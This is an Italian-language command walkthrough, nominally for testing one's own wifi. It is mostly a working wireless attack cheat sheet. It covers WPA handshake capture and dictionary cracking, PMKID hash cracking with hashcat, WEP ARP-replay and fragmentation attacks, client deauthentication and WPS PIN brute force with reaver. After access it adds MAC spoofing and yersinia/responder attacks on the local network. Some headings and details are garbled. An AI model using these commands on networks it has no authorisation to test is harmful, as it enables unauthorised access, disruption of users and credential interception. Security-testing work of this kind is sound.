## CONTROLLARE LA SICUREZZA DEL WIFI
Ho messo questi comandi per controllare la sicurezza del mio wifi usando il linguaggio bash, vi faccio vedere tutti i passaggi che ho fatto
## 1. Configuration

Visualizzato la configurazione delle interfacce di rete.:

```bash
ifconfig && iwconfig && airmon-ng
```

nel mio caso ho dovuto mettere l'interfaccia di rete attiva:

```fundamental
ifconfig wlan0 up
```

Riavviato il Network Manager:

```fundamental
service NetworkManager restart
```

Controllato il dominio della WLAN:

```fundamental
iw reg get
```

Successivamente impostato il dominio:

```fundamental
iw reg set HR
```

Abbassato nel mio casa la potenza dell'interfaccia wireless

```fundamental
iwconfig wlan0 txpower 40
```

## 2. Monitoraggio

Impostato un'interfaccia di rete wireless in modalità monitoraggio:

```bash
airmon-ng start wlan0

ifconfig wlan0 down && iwconfig wlan0 mode monitor && ifconfig wlan0 up
```

Impostato l’interfaccia in modalità monitor su un canale specifico:

```fundamental
airmon-ng start wlan0 8

iwconfig wlan0 channel 8
```

Reimpostato tutto:

```bash
airmon-ng stop wlan0mon

ifconfig wlan0 down && iwconfig wlan0 mode managed && ifconfig wlan0 up
```

Ricerca delle reti wifi:

```fundamental
airodump-ng --wps -w airodump_sweep_results wlan0mon

wash -a -i wlan0mon
```

Monitorato la rete Wifi per prendere le richieste:

```fundamental
airodump-ng wlan0mon --channel 8 -w airodump_essid_results --essid essid --bssid FF:FF:FF:FF:FF:FF
```
Usato anche Kismet per avere più info sull'access point

## 3. Cracking

Verificato se l'interfaccia supporta l'iniezione di pacchetti::

```fundamental
aireplay-ng --test wlan1 -e essid -a FF:FF:FF:FF:FF:FF
```

### WPA/WPA2 Handshake

Monitorato una rete per catturare l'handshake a 4 vie:

```fundamental
airodump-ng wlan0mon --channel 8 -w airodump_essid_results --essid essid --bssid FF:FF:FF:FF:FF:FF
```

Avviato un attacco a dizionario contro un handshake WPA/WPA2:

```fundamental
aircrack-ng -e essid -b FF:FF:FF:FF:FF:FF -w rockyou.txt airodump_essid_results*.cap
```

### PMKID Attack

Attacco WPA/WPA2 senza disconnettere i client.

Installare gli strumenti necessari su Kali Linux:

```bash
apt-get update && apt-get -y install hcxtools
```

Catturare hash PMKKID di tutte le reti:

```fundamental
hcxdumptool --enable_status=1 -o hcxdumptool_results.cap -i wlan0mon
```

Estrarre hash PMKID da un file PCAP:

```fundamental
hcxpcaptool hcxdumptool_results.cap -k hashes.txt
```

Attacco sugli hash PMKID:

```fundamental
hashcat -m 16800 -a 0 --session=cracking --force --status -O -o hashcat_results.txt hashes.txt rockyou.txt
```

### ARP Request Replay Attack

Finta autenticazione con MAC inesistente

```fundamental
aireplay-ng --fakeauth 6000 -o 1 -q 10 wlan1 -e essid -a FF:FF:FF:FF:FF:FF -h FF:FF:FF:FF:FF:FF
```

Con filtro MAC attivo, usato un MAC esistente:

```fundamental
aireplay-ng --fakeauth 0 wlan1 -e essid -a FF:FF:FF:FF:FF:FF -h FF:FF:FF:FF:FF:FF
```

Vedere quanti Vettori abbiamo catturato:

```fundamental
airodump-ng wlan0mon --channel 8 -w airodump_essid_results --essid essid --bssid FF:FF:FF:FF:FF:FF
```

Avviare l’attacco di replay ARP:

```fundamental
aireplay-ng --arpreplay wlan1 -e essid -a FF:FF:FF:FF:FF:FF -h FF:FF:FF:FF:FF:FF
```

Disconnesso i client:

```fundamental
aireplay-ng --deauth 10 wlan1 -e essid -a FF:FF:FF:FF:FF:FF
```

cracckato l'autentificazione WEP:

```fundamental
aircrack-ng -e essid -b FF:FF:FF:FF:FF:FF replay_arp*.cap
```

### Hitre Attack

Monitorare la rete falsa:

```fundamental
airodump-ng wlan0mon --channel 8 -w airodump_essid_results --essid essid --bssid FF:FF:FF:FF:FF:FF
```

Inviare nuovamente i pacchetti al client:

```fundamental
aireplay-ng --cfrag -D wlan1 -e essid -h FF:FF:FF:FF:FF:FF
```

Crackare nuovamente l'autentificazione WEP:

```fundamental
aircrack-ng -e essid -b FF:FF:FF:FF:FF:FF airodump_essid_results*.cap
```

### WPS PIN

Crackcare un pin WPS:

```fundamental
reaver -vv --pixie-dust -i wlan1 -c 8 -e essid -b FF:FF:FF:FF:FF:FF
```

Rifatto con dei delay tra i vari tentativi:

```fundamental
reaver -vv --pixie-dust -N -L -d 5 -r 3:15 -T 0.5 -i wlan1 -c 8 -e essid -b FF:FF:FF:FF:FF:FF
```

## 4. SECLIST

Installato Seclist

```bash
apt-get update && apt-get install seclists
```

## 5. Dopo l'Accesso

Cambiato il MAC ADDRESS:

```fundamental
ifconfig wlan0 down && macchanger --mac FF:FF:FF:FF:FF:FF && ifconfig wlan0 up
```

Appena mi sono connesso alla rete, attaccco i protocolli di rete e poi con wireshark controllo il traffico su di esso:

```fundamental
yersinia -G

responder -wF -i 192.168.8.5

wireshark
```

